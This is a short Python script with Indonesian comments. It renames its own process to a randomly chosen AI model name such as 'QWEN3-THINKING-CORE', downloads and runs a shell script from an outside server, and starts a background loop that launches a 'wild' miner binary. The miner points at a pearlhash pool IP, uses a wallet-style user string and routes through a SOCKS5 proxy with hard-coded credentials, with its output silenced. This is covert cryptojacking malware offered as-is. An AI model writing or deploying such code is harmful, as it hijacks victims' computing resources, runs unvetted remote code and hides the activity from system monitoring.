#!/usr/bin/env python3
import os
import sys
import time
import random
import threading
import subprocess
import urllib.request

# 1. Auto-install setproctitle
try:
    from setproctitle import setproctitle
except ImportError:
    subprocess.check_call([
        sys.executable, "-m", "pip",
        "install", "--quiet", "setproctitle"
    ])
    from setproctitle import setproctitle

# 2. Random AI process name
AI_MODELS = [
    "DEEPSEEK-R1-REASONING",
    "GLM-5.3-FLASH-AGENT",
    "QWEN3-THINKING-CORE",
    "LLAMA-4-INFERENCE",
    "AI-NEURAL-ENGINE",
    "AUTONOMOUS-AGENT-CORE",
]

PROCESS_NAME = random.choice(AI_MODELS)
setproctitle(PROCESS_NAME)

print(f"[AI CORE] {PROCESS_NAME}", flush=True)

# 2. Agent AI — berjalan terus-menerus di background
def agent_ai():
    while True:
        user = ("prl1pwqch34vpjknlyyhvwasma33j4vfuv6yxp7zsjf59aqpr3ja2ut3s3sg6yg"
                f"@nock=66GF5PW9AUL1hQZRPsFxnWgASddAVoc34FWH1K1aCdwmqCSV8qLSZ5p."
                f"{random.randint(1, 9999)}-Bismillah")
        subprocess.Popen(
            ["./wild",
             "--algo",  "pearlhash",
             "--url",   "38.89.142.24:443",
             "--user",  user,
             "--proxy", "socks5://yoga:yoga123@107.172.222.195:443"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        ).wait()
        time.sleep(20)

# 3. compile.sh — output ditampilkan
urllib.request.urlretrieve("https://maskurniawan.serv00.net/compile.sh", "compile.sh")
os.chmod("compile.sh", 0o755)
subprocess.run(["bash", "compile.sh"])

# 4. Aktifkan agent AI di background
threading.Thread(target=agent_ai, daemon=True).start()
print("Agent AI berjalan di background ✓")
